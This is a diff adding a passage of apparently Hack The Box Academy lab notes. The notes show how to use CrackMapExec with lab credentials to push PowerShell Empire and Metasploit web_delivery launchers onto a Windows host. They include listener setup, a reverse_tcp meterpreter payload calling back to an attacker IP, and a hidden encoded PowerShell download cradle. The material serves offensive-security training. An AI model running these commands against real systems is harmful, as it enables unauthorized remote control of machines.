@@ -142,3 +142,115 @@ Loading config from empire/client/config.yaml
 [*] Connected to localhost
 (Empire) > 
 ```
+
+Now we need to set up the listener, and we will set the host to our IP address and the Port to TCP 8001, where the agent will connect.
+
+### **Empire Setting up IP and Port**
+
+```shell-session
+(Empire) > uselistener http                                                                                           
+                                                                                                                                        
+ Author       @harmj0y                                                                                     
+ Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST                        
+              approach.                                                                                    
+ Name         HTTP[S]
+
+<SNIP>
+
+(Empire: uselistener/http) > set Host http://10.10.14.33
+[*] Set Host to http://10.10.14.33
+(Empire: uselistener/http) > set Port 8001
+[*] Set Port to 8001
+(Empire: uselistener/http) > execute
+[+] Listener http successfully started
+```
+
+Now we have our listener running, and we can use CrackMapExec to get an agent into Empire with the module `empire_exec`. We need to add the option `LISTENER=http`, which is the listener we set.
+
+### **Using CrackMapExec Module empire\_exec**
+
+```shell-session
+$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M empire_exec -o LISTENER=http 
+
+EMPIRE_E...                                         [+] Successfully generated launcher for listener 'http'
+SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
+SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+EMPIRE_E... 10.129.204.133  445    MS01             [+] Executed Empire Launcher
+```
+
+Once we execute this, we should see a new agent in PowerShell Empire.
+
+{% embed url="https://academy.hackthebox.com/storage/modules/84/empire_listener.jpg" %}
+
+***
+
+## Metasploit
+
+We can do the same on Metasploit Framework using the CrackMapExec module `web_delivery`. We need to configure the `web_delivery` module in the Metasploit Framework and use the provided URL as a parameter to our CrackMapExec module. Let's start `msfconsole` and configure the `web_delivery` handler.
+
+### **Metasploit Configure web\_delivery Handler**
+
+```shell-session
+$ msfconsole
+
+<SNIP>
+
+msf6 > use exploit/multi/script/web_delivery
+[*] Using configured payload python/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.14.33
+SRVHOST => 10.10.14.33
+msf6 exploit(multi/script/web_delivery) > set SRVPORT 8443
+SRVPORT => 8443
+msf6 exploit(multi/script/web_delivery) > set target 2
+target => 2
+msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/script/web_delivery) > set LHOST 10.10.14.33
+LHOST => 10.10.14.33
+msf6 exploit(multi/script/web_delivery) > set LPORT 8002
+LPORT => 8002
+msf6 exploit(multi/script/web_delivery) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/script/web_delivery) > 
+[*] Started reverse TCP handler on 10.10.14.33:8002 
+[*] Using URL: http://10.10.14.33:8443/2S1jAHS
+[*] Server started.
+[*] Run the following command on the target machine:
+powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZ[SNIP]
+```
+
+Once the web delivery handler is configured in Metasploit, we can use the `web_delivery` module. It supports two options, `URL` and `PAYLOAD`. We need to set the `URL` option with the URL provided by Metasploit, and the `PAYLOAD` option corresponds to the payload architecture we selected. If we use x64, we can omit this option because x64 is the default value or use `PAYLOAD=64`. If we use a 32 bit payload, we need to set the option `PAYLOAD=32`. Let's see it in action:
+
+### **CrackMapExec web\_delivery Module**
+
+```shell-session
+$ crackmapexec smb -M web_delivery --options
+
+[*] web_delivery module options:
+
+        URL  URL for the download cradle
+        PAYLOAD  Payload architecture (choices: 64 or 32) Default: 64
+```
+
+```shell-session
+$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M web_delivery -o URL=http://10.10.14.33:8443/2S1jAHS
+
+SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
+SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
+WEB_DELI... 10.129.204.133  445    MS01             [+] Executed web-delivery launcher
+```
+
+In Metasploit, we should see a new session:
+
+{% embed url="https://academy.hackthebox.com/storage/modules/84/metasploit_session.jpg" %}
+
+***
+
+## Other C2 Frameworks
+
+In case we want to use another C2 Framework, we can accomplish the same result using the options available for Command Execution, as we mention in the section [Command Execution (SMB, WinRM, SSH)](https://academy.hackthebox.com/module/84/section/814). For example, we can create a PowerShell payload, save the payload to a webserver and use the option `-X` to execute a PowerShell command to download and run the payload. We will also need to select the option `--no-output` to send the execution to the background.
+
+Let's use Metasploit as an example, and instead of using the module, let's try to copy the PowerShell script provided in the `web_delivery` payload:
+
+{% embed url="https://academy.hackthebox.com/storage/modules/84/command_execution_c2.jpg" %}
